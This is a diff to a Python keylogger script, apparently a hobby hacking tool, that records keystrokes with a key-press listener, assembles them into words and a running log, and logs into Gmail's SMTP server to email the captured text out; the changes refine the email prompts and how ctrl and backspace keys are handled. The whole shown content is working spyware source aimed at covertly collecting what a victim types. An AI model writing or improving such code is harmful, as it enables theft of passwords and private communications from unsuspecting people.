@@ -17,8 +17,8 @@ __|__/  /_/  _  .___/\___//_/ |_|
                               /____/             /____/  /____/                           
 ''')
 
-email = input('Enter Email to send Data')
-password = getpass.getpass(prompt='App Password(Created in Google manage): ', stream=None)
+email = input('Enter Email to send data: ')
+password = getpass.getpass(prompt='Email App password: ', stream=None)
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
 
@@ -41,13 +41,15 @@ def on_press(key):
             full_log = ''
     elif key == Key.shift_l or key == Key.shift_r:
         return
+    elif key == Key.ctrl_l or key == Key.ctrl_r:
+        return
+    elif key == Key.backspace and len(word) == 0:
+        return
     elif key == Key.backspace:
         word = word[:-1]
     else:
-        char = f'{key}'
-        char = char[1:-1]
-        word += char
-
+        word += str(key).strip("'")
+        
     if key == Key.esc:
         return False
 
